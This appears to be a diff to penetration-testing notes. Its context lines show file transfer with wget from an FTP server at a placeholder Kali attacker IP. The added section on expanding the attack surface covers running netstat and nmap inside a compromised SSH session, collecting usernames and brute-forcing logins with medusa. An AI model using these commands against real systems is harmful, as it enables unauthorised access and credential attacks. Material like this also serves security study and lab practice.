@@ -56,6 +56,8 @@ put C:\Users\raj\avni.txt
 or:
 `wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>)`
 
+# Expanding Attack Surface
+After you gained access to e.g. SSH credentials (`ssh $user@$ip -p $port`), run `netstat` and `nmap` (`nmap localhost`) within the SSH session to list open ports. Then we can do some exploration to find potential usernames and run e.g. medusa within the SSH session. 
 
 # Using Base64
 
